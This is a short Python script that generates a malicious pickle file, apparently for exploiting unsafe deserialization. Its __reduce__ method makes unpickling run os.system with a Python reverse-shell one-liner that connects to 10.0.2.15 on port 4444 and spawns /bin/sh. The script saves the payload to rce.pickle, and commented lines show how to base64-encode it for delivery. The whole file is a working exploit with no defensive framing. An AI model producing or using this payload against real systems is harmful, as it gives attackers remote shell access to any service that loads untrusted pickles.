import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    with open('rce.pickle', 'wb+') as f:
        f.write(pickled)
        f.close()
    
#    print(base64.b64encode(pickled))
    # or
#    print(base64.urlsafe_b64encode(pickled))
